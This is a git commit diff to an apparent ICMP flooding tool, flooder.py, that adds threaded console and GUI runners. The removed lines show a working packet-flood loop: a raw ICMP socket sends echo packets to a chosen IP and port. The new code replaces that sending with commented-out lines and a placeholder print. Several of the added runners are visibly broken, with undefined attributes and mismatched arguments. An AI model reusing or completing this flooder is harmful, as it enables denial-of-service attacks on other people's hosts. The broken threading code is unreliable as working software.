630ba0736eda7c9e1c3c40a70259fa90c34c199d
Bread White <breadrock1@gmail.com>
2021-12-06 02:22:26 +0300

    Has been realized threading for Console mode

--- src/flooder.py
+++ src/flooder.py
@@ -1,5 +1,6 @@
 from sys import exit
 from struct import pack
+from threading import Thread, Event, excepthook, activeCount
 from time import time, sleep
 from signal import signal, SIGINT
 
@@ -11,12 +12,82 @@ from socket import (
     SOCK_RAW,
     IPPROTO_ICMP
 )
+from typing import Any, Dict
+from logging import warning, exception, info
+
+from PyQt5.QtCore import QThread, pyqtSignal
+
+
+class FlooderConsoleRunner(Thread):
+
+    def __init__(self, threads_number: int, arguments: Dict[str, Any]):
+        Thread.__init__(self)
+
+        self.args = arguments
+        self.threads_num = threads_number
+
+        self.all_threads = list()
+        self.flooder = Flooder(
+            ip=self.args.get('ip'),
+            port=self.args.get('port'),
+            length=self.args.get('length'),
+            frequency=self.args.get('frequency')
+        )
+
+    def run(self) -> None:
+        interrupt_event = Event()
+
+        for thread_iter in range(0, self.threads_num):
+
+            thread = Thread(
+                daemon=True,
+                target=self.flooder.run_flooding,
+                name=f'flooding-cmd-thread-{thread_iter}',
+                args=(
+                    self.args.get('ip'),
+                    self.args.get('port'),
+                    self.args.get('length'),
+                    self.args.get('frequency'),
+                )
+            )
+
+            thread.start()
+            interrupt_event.wait()
+
+
+class FlooderGuiRunner(QThread):
+    finished = pyqtSignal
+
+    def __init__(self, num_threads: int, args: Dict[str, Any], parent=None):
+        QThread.__init__(self, parent)
+
+        self.args = args
+        self.all_threads = list()
+        self.num_threads = num_threads
+        self.flooder = Flooder()
+
+    def run(self) -> None:
+        for iter_thread in range(0, self.threads):
+            self.thread = QThread()
+            self.fooder = Flooder()
+                # self.args.get('ip'),
+                # self.args.get('port'),
+                # self.args.get('length'),
+                # self.args.get('frequency')
+            self.all_threads.append(self.thread)
+            self.thread.start()
+
+        [thread.quit() for thread in self.all_threads]
 
 
 class Flooder(object):
-    def __init__(self, threads: int):
-        self.threads = threads
-        self.running_status = True
+
+    def __init__(self, ip: str, port: int, length: int, frequency: float):
+
+        self.ip = ip
+        self.port = port
+        self.length = length
+        self.frequency = frequency
 
     @staticmethod
     def _checksum(message) -> int:
@@ -26,26 +97,37 @@ class Flooder(object):
             summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
         return htons(~summary & 0xffff)
 
-    def _construct_packet(self, length: int):
+    def _construct_packet(self):
         header = pack("bbHHh", 8, 0, 0, 1, 1)
-        data = (length - 50) * 'Q'
+        data = (self.length - 50) * 'Q'
         data = pack("d", time()) + data.encode('ascii')
         header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
         return header + data
 
-    def _close_flooding_event(self, sig, frame):
-        print('You pressed Ctrl+C!')
-        self.running_status = False
-        exit(0)
+    def run_flooding(self) -> None:
+        try:
+            # sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
+            # inet_aton(ip)
 
-    def run_flooding(self, ip: str, port: int, length: int, frequency: float) -> None:
-        signal(SIGINT, self._close_flooding_event)
+            while True: # self.running_status:
+                # packet = self._construct_packet()
+                # sock.sendto(packet, (ip, port))
+                # sleep(frequency)
+                # sock.close()
+                print('Kek')
+                sleep(1)
 
-        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
-        inet_aton(ip)
+        except (KeyboardInterrupt, SystemExit) as e:
+            warning(msg=f'Has been interrupted closing event. Closing all available threads: {e}')
+            return
 
-        while self.running_status:
-            packet = self._construct_packet(length)
-            sock.sendto(packet, (ip, port))
-            sleep(frequency)
-            sock.close()
+
+if __name__ == '__main__':
+    args = {
+        'ip':'127.0.0.1',
+        'port':80,
+        'length':10,
+        'frequency':0.5
+    }
+    t = FlooderConsoleRunner(threads_number=5, arguments=args)
+    t.run()
